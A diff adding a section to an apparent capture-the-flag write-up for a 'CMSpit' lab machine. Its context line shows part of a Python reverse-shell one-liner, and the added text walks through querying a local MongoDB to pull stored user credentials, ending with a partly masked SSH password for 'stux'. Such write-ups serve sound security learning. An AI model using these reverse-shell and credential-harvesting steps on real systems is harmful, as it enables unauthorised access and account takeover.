@@ -111,3 +111,26 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![image](../assets/img/thm/cmspit/reversesheel.png)
 
+## Enum for SSH Creds
+
+in terminal type _mongo_
+
+	>show dbs
+
+	>use sudousersbak
+
+	>show collections
+
+in this we get _webflag_ and user creds..
+	
+	>db.user.find()
+
+	{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ss******123" }
+	{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
+	> 
+
+![image](../assets/img/thm/cmspit/pass.jpg)
+
+Yeah! we got ssh crendentials stux:p4ssxxxxxxxxx123
+
+
